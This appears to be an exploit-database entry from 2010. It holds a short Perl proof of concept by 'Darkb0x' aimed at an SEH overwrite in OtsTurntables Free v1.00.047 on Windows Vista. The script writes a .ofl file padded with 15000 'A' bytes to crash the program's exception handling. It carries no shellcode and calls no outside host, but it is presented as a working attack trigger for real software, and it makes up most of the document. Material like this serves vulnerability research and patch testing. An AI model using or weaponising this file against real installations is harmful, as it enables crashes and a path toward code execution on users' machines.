# Exploit Title: OtsTurntables Free v1.00.047 SEH Overwrite POC
# Date: 14-01-2010
# Author: Darkb0x
# Software Link: http://www.otsturntables.com/download-otsturntables-free/
# Version: 1.00.047
# Tested on:  Windows Vista Ultimate English
# [exploit code]

print "\n\nBy Darkb0x\n" ;
print "Home Page :\n" ;
print "http://NullArea.Net\n" ;
my $junk      = "\x41" x 15000   ;
my $exploit = $junk;
open (file,">>file.ofl");
print file $exploit;
close (file);
print "\n\n\nFile Creation done\n";